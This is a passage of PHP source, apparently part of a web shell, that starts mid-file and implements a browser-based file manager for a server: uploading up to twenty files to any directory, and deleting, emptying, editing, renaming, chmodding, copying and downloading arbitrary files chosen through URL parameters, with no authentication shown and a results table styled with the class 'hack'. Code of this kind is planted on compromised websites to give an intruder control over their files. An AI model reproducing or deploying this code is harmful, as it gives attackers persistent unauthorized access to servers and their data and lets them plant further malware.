$uploadfile18 = "$where/".@$_FILES['text18']['name'];
$uploadfile19 = "$where/".@$_FILES['text19']['name'];
$uploadfile20 = "$where/".@$_FILES['text20']['name'];
if (@move_uploaded_file(@$_FILES['text1']['tmp_name'], $uploadfile1)) {
$where=str_replace("\\\\","\\",$where);
echo "<i>Uploaded to $uploadfile1</i><br>";}
if (@move_uploaded_file(@$_FILES['text2']['tmp_name'], $uploadfile2)) {
$where=str_replace("\\\\","\\",$where);
echo "<i>Uploaded to $uploadfile2</i><br>";}
if (@move_uploaded_file(@$_FILES['text3']['tmp_name'], $uploadfile3)) {
$where=str_replace("\\\\","\\",$where);
echo "<i>Uploaded to $uploadfile3</i><br>";}
if (@move_uploaded_file(@$_FILES['text4']['tmp_name'], $uploadfile4)) {
$where=str_replace("\\\\","\\",$where);
echo "<i>Uploaded to $uploadfile4</i><br>";}
if (@move_uploaded_file(@$_FILES['text5']['tmp_name'], $uploadfile5)) {
$where=str_replace("\\\\","\\",$where);
echo "<i>Uploaded to $uploadfile5</i><br>";}
if (@move_uploaded_file(@$_FILES['text6']['tmp_name'], $uploadfile6)) {
$where=str_replace("\\\\","\\",$where);
echo "<i>Uploaded to $uploadfile6</i><br>";}
if (@move_uploaded_file(@$_FILES['text7']['tmp_name'], $uploadfile7)) {
$where=str_replace("\\\\","\\",$where);
echo "<i>Uploaded to $uploadfile7</i><br>";}
if (@move_uploaded_file(@$_FILES['text8']['tmp_name'], $uploadfile8)) {
$where=str_replace("\\\\","\\",$where);
echo "<i>Uploaded to $uploadfile8</i><br>";}
if (@move_uploaded_file(@$_FILES['text9']['tmp_name'], $uploadfile9)) {
$where=str_replace("\\\\","\\",$where);
echo "<i>Uploaded to $uploadfile9</i><br>";}
if (@move_uploaded_file(@$_FILES['text10']['tmp_name'], $uploadfile10)) {
$where=str_replace("\\\\","\\",$where);
echo "<i>Uploaded to $uploadfile10</i><br>";}
if (@move_uploaded_file(@$_FILES['text11']['tmp_name'], $uploadfile11)) {
$where=str_replace("\\\\","\\",$where);
echo "<i>Uploaded to $uploadfile11</i><br>";}
if (@move_uploaded_file(@$_FILES['text12']['tmp_name'], $uploadfile12)) {
$where=str_replace("\\\\","\\",$where);
echo "<i>Uploaded to $uploadfile12</i><br>";}
if (@move_uploaded_file(@$_FILES['text13']['tmp_name'], $uploadfile13)) {
$where=str_replace("\\\\","\\",$where);
echo "<i>Uploaded to $uploadfile13</i><br>";}
if (@move_uploaded_file(@$_FILES['text14']['tmp_name'], $uploadfile14)) {
$where=str_replace("\\\\","\\",$where);
echo "<i>Uploaded to $uploadfile14</i><br>";}
if (@move_uploaded_file(@$_FILES['text15']['tmp_name'], $uploadfile15)) {
$where=str_replace("\\\\","\\",$where);
echo "<i>Uploaded to $uploadfile15</i><br>";}
if (@move_uploaded_file(@$_FILES['text16']['tmp_name'], $uploadfile16)) {
$where=str_replace("\\\\","\\",$where);
echo "<i>Uploaded to $uploadfile16</i><br>";}
if (@move_uploaded_file(@$_FILES['text17']['tmp_name'], $uploadfile17)) {
$where=str_replace("\\\\","\\",$where);
echo "<i>Uploaded to $uploadfile17</i><br>";}
if (@move_uploaded_file(@$_FILES['text18']['tmp_name'], $uploadfile18)) {
$where=str_replace("\\\\","\\",$where);
echo "<i>Uploaded to $uploadfile18</i><br>";}
if (@move_uploaded_file(@$_FILES['text19']['tmp_name'], $uploadfile19)) {
$where=str_replace("\\\\","\\",$where);
echo "<i>Uploaded to $uploadfile19</i><br>";}
if (@move_uploaded_file(@$_FILES['text20']['tmp_name'], $uploadfile20)) {
$where=str_replace("\\\\","\\",$where);
echo "<i>Uploaded to $uploadfile20</i><br>";}
}
echo $copyr;
exit;}

if(@$_GET['yes']=="yes"){
$d=@$_GET['d']; $e=@$_GET['e'];
unlink($d."/".$e);
$delresult="Success $d/$e deleted <meta http-equiv=\"REFRESH\" content=\"2;URL=$php_self?d=$d\">";
}
if(@$_GET['clean']=="1"){
@$e=$_GET['e'];
$x=fopen("$d/$e","w");
fwrite($x,"");
echo "<meta http-equiv=\"REFRESH\" content=\"0;URL=$php_self?d=$d&e=".@$e."\">";
exit;
}


if(@$_GET['e']){
$d=@$_GET['d'];
$e=@$_GET['e'];
$pinf=pathinfo($e);
if(in_array(".".@$pinf['extension'],$images)){
echo "<meta http-equiv=\"REFRESH\" content=\"0;URL=$php_self?d=$d&e=$e&img=1\">";
exit;}
$filename="$d/$e";
$fd = @fopen ($filename, "r");
$c = @fread ($fd, @filesize ($filename));
$c=htmlspecialchars($c);
$de=$d."/".$e;
$de=str_replace("//","/",$de);
if(is_file($de)){
if(!is_writable($de)){echo "<font color=red>READ ONLY</font><br>";}}
echo "[<a href='$php_self?d=$d&del_f=1&wich_f=$e'>Delete</a>] [<a href='$php_self?d=$d&ef=$e&edit=1'>Edit</a>] [<a href='$php_self?d=$d&e=$e&clean=1'>Filesize to 0 byte</a>] [<a href='$php_self?d=$d&e=$e&replace=1'>Replace text in file</a>] [<a href='$php_self?d=$d&download=$e'>Download</a>] [<a href='$php_self?d=$d&rename=1&wich_f=$e'>Rename</a>] [<a href='$php_self?d=$d&chmod=1&wich_f=$e'>CHMOD</a>] [<a href='$php_self?d=$d&ccopy_to=$e'>Copy</a>]<br>";
echo "
File contents:<br>
$de
<br>
<table width=100% border=1 cellpadding=0 cellspacing=0>
<tr><td><pre>
$c

</pre></td></tr>
</table>

";
echo "<META HTTP-EQUIV=Refresh CONTENT='3; URL=$PHP_SELF?d=$d'>";

if(@$_GET['delete']=="1"){
$delete=$_GET['delete'];
echo "
DELETE: Are you sure?<br>
<a href=\"$php_self?d=$d&e=$e&delete=".@$delete."&yes=yes\">Yes</a> || <a href='$php_self?no=1'>No</a>
<br>
";
if(@$_GET['yes']=="yes"){
@$d=$_GET['d']; @$e=$_GET['e'];
echo $delresult;
}
if(@$_GET['no']){
echo "<meta http-equiv=\"REFRESH\" content=\"0;URL=$php_self?d=$d&e=$e\">
";
}


} #end of delete
echo $copyr;
exit;
} #end of e

if(@$_GET['edit']=="1"){
@$d=$_GET['d'];
@$ef=$_GET['ef'];
$e=$ef;
if(is_file($d."/".$ef)){
if(!is_writable($d."/".$ef)){echo "<font color=red>READ ONLY</font><br>";}}
echo "[<a href='$php_self?d=$d&del_f=1&wich_f=$e'>Delete</a>] [<a href='$php_self?d=$d&ef=$e&edit=1'>Edit</a>] [<a href='$php_self?d=$d&e=$e&clean=1'>Filesize to 0 byte</a>] [<a href='$php_self?d=$d&e=$e&replace=1'>Replace text in file</a>] [<a href='$php_self?d=$d&download=$e'>Download</a>] [<a href='$php_self?d=$d&rename=1&wich_f=$e'>Rename</a>] [<a href='$php_self?d=$d&chmod=1&wich_f=$e'>CHMOD</a>] [<a href='$php_self?d=$d&ccopy_to=$e'>Copy</a>]<br>";
$filename="$d/$ef";
$fd = @fopen ($filename, "r");
$c = @fread ($fd, @filesize ($filename));
$c=htmlspecialchars($c);
$de=$d."/".$ef;
$de=str_replace("//","/",$de);
echo "
Edit:<br>
$de<br>";

if(!@$_POST['save']){
print "
<form method=post>
<input name=filename value='$d/$ef'>
<textarea cols=143 rows=30 name=editf>$c</textarea>
<br>
<input type=submit name=save value='Save changes'></form><br>
";
}
if(@$_POST['save']){
$editf=@$_POST['editf'];

if(get_magic_quotes_runtime() or get_magic_quotes_gpc()){
$editf=stripslashes($editf);
}

$f=fopen($filename,"w+");
fwrite($f,"$editf");
echo "<br>
<b>File edited.</b>
<meta http-equiv=\"REFRESH\" content=\"0;URL=$php_self?d=$d&e=$ef\">";
exit;
}
echo $copyr;
exit;
}



echo"
<table width=100% cellpadding=1 cellspacing=0 class=hack>
<tr><td bgcolor=#519A00><center><b>Filename</b></td><td bgcolor=#519A00><center><b>Tools</b></td><td bgcolor=#519A00><b>Size</b></td><td bgcolor=#519A00><center><b>Owner/Group</b></td><td bgcolor=#519A00><b>Perms</b></td></tr>
";
$dirs=array();
$files=array();
$dh = @opendir($d) or die("<table width=100%><tr><td><center>Permission Denied or Folder/Disk does not exist</center><br>$copyr</td></tr></table>");
while (!(($file = readdir($dh)) === false)) {
if ($file=="." || $file=="..") continue;
if (@is_dir("$d/$file")) {
      $dirs[]=$file;
}else{
      $files[]=$file;
      }
   sort($dirs);
   sort($files);

$fz=@filesize("$d/$file");
}

function perm($perms){
if (($perms & 0xC000) == 0xC000) {
   $info = 's';
} elseif (($perms & 0xA000) == 0xA000) {
   $info = 'l';
} elseif (($perms & 0x8000) == 0x8000) {
   $info = '-';
} elseif (($perms & 0x6000) == 0x6000) {
   $info = 'b';
} elseif (($perms & 0x4000) == 0x4000) {
   $info = 'd';
} elseif (($perms & 0x2000) == 0x2000) {
   $info = 'c';
} elseif (($perms & 0x1000) == 0x1000) {
   $info = 'p';
} else {
   $info = 'u';
}
$info .= (($perms & 0x0100) ? 'r' : '-');
$info .= (($perms & 0x0080) ? 'w' : '-');
$info .= (($perms & 0x0040) ?
           (($perms & 0x0800) ? 's' : 'x' ) :
           (($perms & 0x0800) ? 'S' : '-'));
$info .= (($perms & 0x0020) ? 'r' : '-');
$info .= (($perms & 0x0010) ? 'w' : '-');
$info .= (($perms & 0x0008) ?
           (($perms & 0x0400) ? 's' : 'x' ) :
           (($perms & 0x0400) ? 'S' : '-'));
$info .= (($perms & 0x0004) ? 'r' : '-');
$info .= (($perms & 0x0002) ? 'w' : '-');
$info .= (($perms & 0x0001) ?
           (($perms & 0x0200) ? 't' : 'x' ) :
           (($perms & 0x0200) ? 'T' : '-'));
return $info;
}


for($i=0; $i<count($dirs); $i++){

$perms = @fileperms($d."/".$dirs[$i]);
$owner = @fileowner($d."/".$dirs[$i]);
if($os=="unix"){
$fileownera=posix_getpwuid($owner);
$owner=$fileownera['name'];
}
$group = @filegroup($d."/".$dirs[$i]);
if($os=="unix"){
$groupinfo = posix_getgrgid($group);
$group=$groupinfo['name'];
}
$info=perm($perms);
if($i%2){$color="#D7FFA8";}else{$color="#D1D1D1";}
$linkd="<a href='$php_self?d=$d/$dirs[$i]'>$dirs[$i]</a>";
$linkd=str_replace("//","/",$linkd);
echo "<tr><td bgcolor=$color><font face=wingdings size=2>0</font> $linkd</td><td bgcolor=$color><center><font color=blue>DIR</font></td><td bgcolor=$color>&nbsp;</td><td bgcolor=$color><center>$owner/$group</td><td bgcolor=$color>$info</td></tr>";
}

for($i=0; $i<count($files); $i++){

$size=@filesize($d."/".$files[$i]);
$perms = @fileperms($d."/".$files[$i]);
$owner = @fileowner($d."/".$files[$i]);
if($os=="unix"){
$fileownera=posix_getpwuid($owner);
$owner=$fileownera['name'];
}
$group = @filegroup($d."/".$files[$i]);
if($os=="unix"){
$groupinfo = posix_getgrgid($group);
$group=$groupinfo['name'];
}
$info=perm($perms);
if($i%2){$color="#D1D1D1";}else{$color="#D7FFA8";}

if ($size < 1024){$siz=$size.' b';
}else{
if ($size < 1024*1024){$siz=number_format(($size/1024), 2, '.', '').' kb';}else{
if ($size < 1000000000){$siz=number_format($size/(1024*1024), 2, '.', '').' mb';}else{
if ($size < 1000000000000){$siz=number_format($size/(1024*1024*1024), 2, '.', '').' gb';}
}}}
echo "<tr><td bgcolor=$color><font face=wingdings size=3>2</font> <a href='$php_self?d=$d&e=$files[$i]'>$files[$i]</a></td><td bgcolor=$color><center><a href=\"javascript:ShowOrHide('$i','')\">[options]</a><div id='$i' style='display:none;z-index:1;' ><a href='$php_self?d=$d&ef=$files[$i]&edit=1' title='Edit $files[$i]'><b>Edit</b></a><br><a href='$php_self?d=$d&del_f=1&wich_f=$files[$i]' title='Delete $files[$i]'><b>Delete</b></a><br><a href='$php_self?d=$d&chmod=1&wich_f=$files[$i]' title='chmod $files[$i]'><b>CHMOD</b></a><br><a href='$php_self?d=$d&rename=1&wich_f=$files[$i]' title='Rename $files[$i]'><b>Rename</b></a><br><a href='$php_self?d=$d&download=$files[$i]' title='Download $files[$i]'><b>Download</b></a><br><a href='$php_self?d=$d&ccopy_to=$files[$i]' title='Copy $files[$i] to?'><b>Copy</b></a></div></td><td bgcolor=$color>$siz</td><td bgcolor=$color><center>$owner/$group</td><td bgcolor=$color>$info</td></tr>";
}

echo "</table></td></tr></table>";
echo $copyr;
?>